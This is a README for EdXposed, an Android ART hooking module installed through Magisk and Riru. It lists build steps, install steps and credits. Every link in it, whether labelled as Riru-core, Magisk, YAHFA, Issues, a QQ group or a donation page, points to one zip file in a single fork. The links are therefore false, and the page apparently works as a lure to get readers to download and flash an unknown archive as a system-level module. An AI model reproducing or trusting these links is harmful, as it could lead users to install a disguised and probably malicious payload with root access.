# EdXposed

A Riru module trying to provide a ART hooking framework (initially for Android Pie) which delivers consistent APIs with the OG Xposed, leveraging YAHFA hooking framework.

## Supported versions

- Android Oreo (8.0, 8.1) 
- Android Pie (9.0)

For devices with Android 7.x and lower, original Xposed is strongly recommended.

## Build requirements

Same as [Riru-Core's](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip)
and zip binaries can be downloaded from [here](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip).

## Build

1. Execute task `:edxp-core:[zip|push][Yahfa|Sandhook]Release` to build flashable zip for corresponding variant.
2. Find the flashable under `edxp-core/release/`.
3. Flash the zip in recovery mode or via Magisk Manager.

## Install

1. Make sure Magisk v17.0 or higher is installed.
2. Download [Riru-core](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip) v10 or higher and install it in Magisk Manager or recovery.
3. Download [EdXposed](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip) and install it in Magisk Manager or recovery.
4. Install companion application.
4. Reboot.
5. Have fun! :)

## Companion applications

- For v0.2.9.5 and before: [Xposed Installer](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip).
- For v0.2.9.6 and v0.2.9.7: [Xposed Installer](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip) and [EdXp Manager](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip)(optional).
- For v0.2.9.8 and later: [EdXposed Installer](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip).

## Useful links

- [List of Xposed Modules For Android Pie Working With EdXposed](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip) (thanks to Uraniam9 @ xda-developers)

## Known issues

- May not be compatible with all ART devices.
- File access services are not implemented yet, now EdXp simply uses magiskpolicy to enable needed SELinux policies.

## Get help

- GitHub issues (recommended): [Issues](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip)
- QQ Group: [855219808](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip)

## Contribute

- Apparently this framework is far from stable and all kinds of PRs are welcome. :)
- [Buy me a coffee](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip) if you like my work.

## Credits 

- [YAHFA](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): the core ART hooking framework
- [Magisk](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): makes all these possible
- [Riru](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): provides a way to inject codes into zygote process
- [XposedBridge](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): the OG xposed framework APIs
- [dexmaker](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip) and [dalvikdx](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): to dynamiclly generate YAHFA hooker classes
- [Whale](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): used for inline hooking
- [SandHook](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/edxp-core/misc/Xposed_Ed_v3.6-alpha.5.zip): ART hooking framework for SandHook variant

